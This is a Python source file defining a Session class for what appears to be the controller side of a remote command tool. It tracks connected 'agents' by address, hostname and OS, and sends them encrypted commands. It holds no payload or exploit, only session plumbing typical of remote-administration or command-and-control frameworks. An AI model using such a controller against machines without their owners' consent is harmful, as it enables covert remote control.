import socket
import time

from src.utils.lib import send_msg, recv_msg
from src.utils.protocol import make_msg, parse_msg, OP_CMD
from src.utils.logger import setup_logger

log = setup_logger("session")


class Session:
    def __init__(self, agent_id, sock, addr, key):
        self.id = agent_id
        self.sock = sock
        self.addr = addr
        self.key = key
        self.connected_at = time.strftime("%Y-%m-%d %H:%M:%S")
        self.os_info = "?"
        self.hostname = "?"

    def send_cmd(self, cmd):
        msg = make_msg(OP_CMD, payload=cmd)
        send_msg(self.sock, msg, self.key)

    def recv_response(self):
        raw = recv_msg(self.sock, self.key)
        return parse_msg(raw)

    def close(self):
        try:
            self.sock.close()
        except Exception:
            pass

    def __str__(self):
        return f"[{self.id}] {self.addr[0]}:{self.addr[1]} | {self.hostname} | {self.os_info} | {self.connected_at}"
